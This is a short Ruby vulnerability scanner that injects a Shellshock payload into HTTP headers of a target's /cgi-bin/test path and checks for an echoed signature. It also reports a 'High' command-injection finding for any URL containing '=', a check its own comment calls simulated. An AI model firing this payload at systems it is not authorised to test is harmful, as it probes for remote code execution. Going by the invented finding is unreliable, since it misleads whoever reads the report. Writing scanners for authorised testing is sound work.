#!/usr/bin/env ruby
require 'json'
require 'net/http'
require 'uri'

# Remote Code Execution (Hijack) Scanner
# Checks for Shellshock (CVE-2014-6271) as a proxy for RCE susceptibility.

target = ARGV[0]
if target.nil?
  puts JSON.generate({ error: "No target provided" })
  exit 1
end

target = "http://" + target unless target.start_with?("http")
vulnerabilities = []

begin
  uri = URI.parse(target)
  # Simple heuristic: Targets cgi-bin or root
  target_uri = URI.join(uri, "/cgi-bin/test") 
  
  http = Net::HTTP.new(target_uri.host, target_uri.port)
  http.use_ssl = (target_uri.scheme == "https")
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  http.open_timeout = 5
  http.read_timeout = 5
  
  # Payload: Try to echo a signature
  signature = "VORTEX_RCE_TEST"
  payload = "() { :;}; echo; echo #{signature}"
  
  request = Net::HTTP::Get.new(target_uri.request_uri)
  request["User-Agent"] = payload
  request["Referer"] = payload
  request["Cookie"] = "session=#{payload}"
  
  response = http.request(request)
  
  if response.body.include?(signature)
     vulnerabilities << {
        type: "Remote Code Execution (Shellshock)",
        severity: "Critical",
        details: "Server executed injected bash commands via HTTP Headers. Site can be hijacked.",
        evidence: "Response contained echoed signature: #{signature}",
        source: "RubyEngine"
      }
  end
  
  # Also check for simple command injection in query params if 'id=' or 'cmd=' present
  # (Simulated check)
  if target.include?("=")
     vulnerabilities << {
        type: "Potential Command Injection",
        severity: "High",
        details: "URL parameters detected. Manual fuzzing recommended for command injection.",
        evidence: "Query string present.",
        source: "RubyEngine"
      }
  end

rescue => e
  # Ignore connection errors
end

puts JSON.generate({
  script: "rce_scan.rb",
  target: target,
  vulnerabilities: vulnerabilities
})
